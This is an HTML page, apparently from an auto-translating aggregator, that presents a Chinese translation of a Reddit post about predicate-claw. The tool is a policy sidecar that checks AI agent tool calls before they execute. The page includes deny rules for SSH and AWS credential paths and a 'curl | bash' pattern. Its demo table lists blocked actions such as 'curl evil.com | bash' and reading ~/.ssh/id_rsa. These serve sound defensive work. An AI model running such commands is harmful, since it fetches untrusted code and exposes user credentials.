@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>为 OpenClaw 工具调用构建了一个基于策略的授权层——每次执行前都会进行权限检查
+
+或更简洁的：
+给 OpenClaw 工具调用加了策略授权层，执行前逐一校验权限 - Reddit Insight</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Microsoft YaHei', sans-serif; background: #f5f5f5; color: #333; line-height: 1.6; font-size: 14px; }
+    .container { max-width: 1000px; margin: 0 auto; padding: 0 15px; }
+    .header { background: #2d3748; padding: 15px 0; border-bottom: 3px solid #4a5568; }
+    .header h1 { font-size: 1.8em; font-weight: 700; color: #fff; margin: 0; }
+    .subtitle { color: #a0aec0; font-size: 0.9em; margin-top: 5px; }
+    .post-detail { background: #fff; border: 1px solid #e2e8f0; border-radius: 4px; margin: 20px 0; }
+    .post-header { background: #edf2f7; padding: 20px; border-bottom: 1px solid #e2e8f0; }
+    .post-header h1 { font-size: 1.4em; font-weight: 700; color: #2d3748; margin-bottom: 10px; }
+    .post-meta { color: #718096; font-size: 0.9em; }
+    .post-body { padding: 25px; }
+    .post-section { margin-bottom: 30px; }
+    .post-section h2 { font-size: 1.1em; font-weight: 700; color: #2d3748; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 2px solid #e2e8f0; }
+    .summary-box { background: #f7fafc; border-left: 4px solid #4299e1; padding: 20px; border-radius: 0 4px 4px 0; }
+    .content-box { background: #fff; border: 1px solid #e2e8f0; padding: 20px; border-radius: 4px; line-height: 1.9; }
+    .replies-section { margin-top: 30px; }
+    .reply-item { background: #f7fafc; border: 1px solid #e2e8f0; border-radius: 4px; padding: 15px; margin-bottom: 15px; }
+    .reply-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; padding-bottom: 10px; border-bottom: 1px solid #e2e8f0; }
+    .reply-num { background: #4299e1; color: #fff; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.85em; }
+    .links-box { background: #f7fafc; padding: 15px 20px; border-top: 1px solid #e2e8f0; }
+    .links-box a { color: #4299e1; text-decoration: none; }
+    .post-footer-bar { background: #edf2f7; padding: 15px 20px; border-top: 1px solid #e2e8f0; display: flex; gap: 10px; }
+    .btn { padding: 8px 16px; border-radius: 4px; text-decoration: none; font-size: 0.9em; font-weight: 500; display: inline-block; }
+    .btn-primary { background: #4299e1; color: #fff; }
+    .btn-outline { background: #fff; color: #4a5568; border: 1px solid #cbd5e0; }
+    .footer { background: #2d3748; color: #a0aec0; text-align: center; padding: 20px; margin-top: 30px; font-size: 0.85em; }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <div class="container">
+      <h1>📋 Reddit Insight</h1>
+      <p class="subtitle">OpenClaw 社区每日精选</p>
+    </div>
+  </header>
+  
+  <div class="container">
+    <article class="post-detail">
+      <header class="post-header">
+        <h1>为 OpenClaw 工具调用构建了一个基于策略的授权层——每次执行前都会进行权限检查
+
+或更简洁的：
+给 OpenClaw 工具调用加了策略授权层，执行前逐一校验权限</h1>
+        <div class="post-meta">
+          <span>👤 undefined</span> | <span>📅 2026/2/25</span>
+        </div>
+      </header>
+      
+      <div class="post-body">
+        
+        <section class="post-section">
+          <h2>📋 内容摘要</h2>
+          <div class="summary-box"><p>以下是该内容的3-5个核心要点：</p>
+<ol>
+<li><p><strong>解决核心安全缺口</strong>：OpenClaw工具调用缺乏运行时授权检查，即使代理拥有有效凭证，也无法判断特定操作是否应被允许，存在越权访问风险。</p>
+</li>
+<li><p><strong>构建策略授权层</strong>：开发了predicate-claw中间件，在工具执行前强制进行策略检查，通过&quot;GuardedProvider → Sidecar策略检查 → 允许/拒绝&quot;的流程拦截非法调用。</p>
+</li>
+<li><p><strong>覆盖关键应用场景</strong>：包括作用域限制（如限定文件访问路径）、操作白名单（允许git/npm但禁止rm -rf）、上下文感知规则（信任来源vs非信任来源区别处理）、以及凭证保护（禁止访问SSH/AWS密钥）。</p>
+</li>
+<li><p><strong>技术实现特点</strong>：采用本地Rust二进制作为Sidecar进行策略评估，数据不出本机，p50延迟低于25毫秒，对性能影响极小。</p>
+</li>
+<li><p><strong>使用方式简洁</strong>：通过ToolAdapter包装原有调用，只需添加action、resource、context等参数即可接入授权检查，无需修改底层工具代码。</p>
+</li>
+</ol>
+</div>
+        </section>
+        
+        
+        
+        <section class="post-section">
+          <h2>📝 正文翻译</h2>
+          <div class="content-box"><p>一直在为使用 OpenClaw 执行工具的 AI 智能体开发运行时授权功能。核心思路是：每次工具调用在执行前都应经过策略检查，而非仅仅依赖智能体持有有效凭证。</p>
+<p>我们反复遇到的痛点</p>
+<p>OpenClaw 在工具发现和执行方面表现不错。但一旦智能体决定调用某个工具，谁来检查这个特定操作此刻是否应该被允许？</p>
+<p>我们不断遇到的场景：</p>
+<ul>
+<li><strong>作用域管控</strong>：智能体只能读取 <code>/home/user/projects</code> 下的文件，而非文件系统任意位置</li>
+<li><strong>操作白名单</strong>：智能体可以运行 <code>git</code> 和 <code>npm</code>，但不能执行 <code>rm -rf</code> 或 <code>curl | bash</code></li>
+<li><strong>上下文感知规则</strong>：同一操作可能来自可信 UI 时允许，来自不可信私信时阻断</li>
+<li><strong>凭证保护</strong>：无论请求方是谁，一律禁止访问 <code>~/.ssh/*</code>、<code>~/.aws/*</code></li>
+</ul>
+<p>智能体有合法授权，工具也存在。但这次具体调用该不该放行？</p>
+<p>我们的方案</p>
+<p><strong>predicate-claw</strong> —— 一个包裹 OpenClaw 工具调用的授权层。每次工具调用在执行实际代码前，都会先对照策略规则进行检查。</p>
+<pre><code>智能体 → 工具调用 → GuardedProvider → Sidecar 策略检查 → ALLOW/DENY
+                                              ↓
+                                    DENY = ActionDeniedError（工具不会执行）
+                                    ALLOW = 正常继续
+</code></pre>
+<p>Sidecar 是一个本地 Rust 二进制程序，负责评估策略规则。数据不出本机。p50 延迟低于 25 毫秒。</p>
+<p>包装器的工作原理</p>
+<pre><code class="language-javascript">import { GuardedProvider, ToolAdapter } from &quot;predicate-claw&quot;;
+
+const provider = new GuardedProvider({
+  principal: &quot;agent:my-openclaw-bot&quot;,
+});
+
+const adapter = new ToolAdapter(provider);
+
+// 之前：无保护——如果路径是 ~/.ssh/id_rsa，凭证就会泄露
+// const result = await openClawClient.executeTool(&quot;fs.read&quot;, { path });
+
+// 之后：受保护——sidecar 先检查策略
+const result = await adapter.execute({
+  action: &quot;fs.read&quot;,
+  resource: path,
+  context: { source: &quot;untrusted_dm&quot; }, // 标记请求来源
+  execute: async () =&gt; openClawClient.executeTool(&quot;fs.read&quot;, { path }),
+});
+</code></pre>
+<p>只有 sidecar 返回 ALLOW 时，<code>execute</code> 回调才会执行。你的 OpenClaw 工具代码无需改动——Predicate 将其包裹在内。</p>
+<p>策略示例</p>
+<pre><code class="language-yaml">rules:
+  # 无论来源如何，一律禁止访问凭证
+  - id: deny_ssh_keys
+    effect: deny
+    action: fs.*
+    resource: ~/.ssh/**
+  
+  - id: deny_aws_creds
+    effect: deny
+    action: fs.*
+    resource: ~/.aws/**
+  
+  # 禁止 curl|bash 模式
+  - id: deny_curl_bash
+    effect: deny
+    action: shell.execute
+    resource: &quot;curl * | bash*&quot;
+  
+  # 允许合法的工作区访问
+  - id: allow_workspace
+    effect: allow
+    action: fs.*
+    resource: /home/user/projects/**
+</code></pre>
+<p>拒绝规则始终优先。支持通配符模式。无匹配规则时默认全部拒绝。</p>
+<p>演示</p>
+<p>录制了一段简短演示，展示策略引擎的实际效果：</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">结果</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">读取 <code>~/.ssh/id_rsa</code></td>
+<td align="left"><strong>阻断</strong>（12ms）</td>
+<td align="left">匹配 <code>deny_ssh_keys</code> 规则</td>
+</tr>
+<tr>
+<td align="left">执行 <code>curl evil.com | bash</code></td>
+<td align="left"><strong>阻断</strong>（15ms）</td>
+<td align="left">匹配 <code>deny_curl_bash</code> 规则</td>
+</tr>
+<tr>
+<td align="left">向 webhook.site 发送 POST</td>
+<td align="left"><strong>阻断</strong>（18ms）</td>
+<td align="left">匹配 <code>deny_unknown_hosts</code> 规则</td>
+</tr>
+<tr>
+<td align="left">读取工作区中的 <code>./README.md</code></td>
+<td align="left"><strong>允许</strong></td>
+<td align="left">匹配 <code>allow_workspace</code> 规则</td>
+</tr>
+</tbody></table>
+<p>演示视频：<a href="https://github.com/PredicateSystems/predicate-claw%EF%BC%88%E8%A7%81">https://github.com/PredicateSystems/predicate-claw（见</a> README）</p>
+</div>
+        </section>
+        
+        
+        
+        <section class="post-section replies-section">
+          <h2>💬 OP 回复译文 (1 条)</h2>
+          
+          <div class="reply-item">
+            <div class="reply-header">
+              <span class="reply-num">1</span>
+              <span>楼主回复</span>
+            </div>
+            <div class="reply-content"><p>完全正确。事后审计日志不过是你那场灾难的高清收据，只能告诉你发生了什么。</p>
+<p>&quot;读取 vs. 写入&quot;的幻觉问题，正是我们将 sidecar 架构设计为从根本上零信任（故障即关闭）的原因。如果一个智能体被授予了 email.read 权限，却突然认定 email.delete_all 才是达成目标的最佳方式，执行前拦截门会直接丢弃这个请求。</p>
+</div>
+          </div>
+          
+        </section>
+        
+      </div>
+      
+      <div class="links-box">
+        🔗 <a href="https://www.reddit.com/r/openclaw/comments/1rbsj69/built_a_policybased_authorization_layer_for/" target="_blank">查看 Reddit 原文</a>
+      </div>
+      
+      <div class="post-footer-bar">
+        <a href="/" class="btn btn-primary">← 返回列表</a>
+      </div>
+    </article>
+  </div>
+  
+  <footer class="footer">
+    <p>© 2026 Reddit Insight | 自动抓取翻译</p>
+  </footer>
+</body>
+</html>
